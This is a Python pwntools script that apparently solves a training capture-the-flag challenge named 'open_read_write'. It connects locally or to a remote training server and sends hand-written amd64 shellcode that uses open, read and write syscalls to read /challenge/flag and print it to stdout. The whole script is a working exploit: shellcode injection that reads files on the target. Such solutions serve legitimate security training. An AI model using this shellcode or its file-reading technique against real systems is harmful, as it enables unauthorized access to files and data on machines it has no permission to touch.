# Open, Read, Write approach
# Flag is at /challenge/flag

from pwn import *

COMMANDS = """
b *0x0000000000401551
c
"""
context.arch = "amd64"

# python3 b.py DEBUG

if args.REMOTE:
    c = remote("open-read-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./open_read_write", gdbscript=COMMANDS)
    else:
        c = process("./open_read_write")


shellcode = """
// ----open----
xor rax, rax
mov rax, 0x02
mov rdi, 0x0067616c662f6567
push rdi
mov rdi, 0x6e656c6c6168632f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
// ----read----
mov rdi, rax
xor rax, rax
mov rdx, 60
mov rsi, rsp
syscall
// ----write----
xor rax, rax
mov rax, 1
xor rdi, rdi
mov rdi, 1
mov rsi, rsp
mov rdx, 60
syscall
"""
shellcode_c = asm(shellcode)

c.send(shellcode_c)
c.interactive()
